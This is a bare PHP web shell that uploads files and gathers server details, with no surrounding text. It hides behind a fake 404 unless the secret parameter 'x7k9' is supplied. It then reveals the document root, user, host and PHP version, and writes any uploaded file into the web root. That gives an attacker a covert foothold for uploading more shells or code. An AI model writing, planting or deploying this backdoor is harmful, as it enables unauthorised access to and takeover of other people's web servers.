<?php
@set_time_limit(0);
@ini_set('memory_limit','512M');
$p='x7k9';
if(($_REQUEST['p']??'')!==$p){http_response_code(404);die('Not Found');}
$d=rtrim($_SERVER['DOCUMENT_ROOT']??getcwd(),'/');
$a=$_REQUEST['a']??'';
if($a==='i'){header('Content-Type:application/json');die(json_encode(['ok'=>1,'d'=>$d,'u'=>get_current_user(),'h'=>$_SERVER['HTTP_HOST']??'','php'=>PHP_VERSION]));}
if($_SERVER['REQUEST_METHOD']==='POST'&&!empty($_FILES['f'])){
$n=basename($_FILES['f']['name']);
$t=$d.'/'.$n;
if(move_uploaded_file($_FILES['f']['tmp_name'],$t)){@chmod($t,0644);echo"OK: $t (".filesize($t)."b)";}
else{echo"FAIL: move error";}
exit;}
?>
<form method="post" enctype="multipart/form-data"><input type="hidden" name="p" value="<?=$p?>"><input type="file" name="f"><button>Up</button></form>
